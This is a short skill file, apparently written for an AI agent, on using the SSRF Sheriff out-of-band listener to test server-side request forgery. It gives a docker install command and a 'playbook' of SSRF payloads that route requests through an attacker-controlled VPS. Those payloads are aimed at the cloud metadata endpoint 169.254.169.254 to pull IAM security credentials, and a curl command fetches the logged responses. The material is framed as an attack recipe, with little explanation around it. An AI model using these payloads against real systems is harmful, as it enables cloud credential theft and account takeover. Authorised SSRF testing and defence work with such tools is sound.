---
name: ssrf-sheriff-oob
description: "SSRF Sheriff exfiltrates cloud metadata via SSRF. Signals: web vulnerability, injection, outbound request logging, cloud metadata exfiltration, retrieved triggered URL records"
zh-signals: "SSRF Sheriff: 云元数据 SSRF 外带。信号:web漏洞,注入,对外发起请求并记录,云元数据外带,取回触发的 URL 记录。"
when-to-use: >-
  Use when testing SSRF vulnerabilities and you need an out-of-band listener
  that logs triggered requests and exfiltrates cloud metadata.
---

# SSRF Sheriff

- Attack Category: C09 Web Exploitation (SSRF)
- Upstream Repository: https://github.com/teknogeek/ssrf-sheriff
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
docker run -p 127.0.0.1:8888:8888 -d jaredmauch/ssrf-sheriff
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `http://<vps>:8888/x?u={URL}` | Send an outbound request and log it |
| `payload: http://<vps>:8888/x?u=http://169.254.169.254/` | Cloud metadata exfiltration |
| `curl http://<vps>:8888/keys` | Retrieve the triggered URL records |

## Attack Scenario Playbook

### Cloud metadata SSRF exfiltration

```bash
# Inject the parameter http://vps:8888/x?u=http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://vps:8888/keys  # View the full triggered URL and response
```

## Notes

Self-hosted OOB receiver designed for SSRF probing, records the complete externally triggered request.
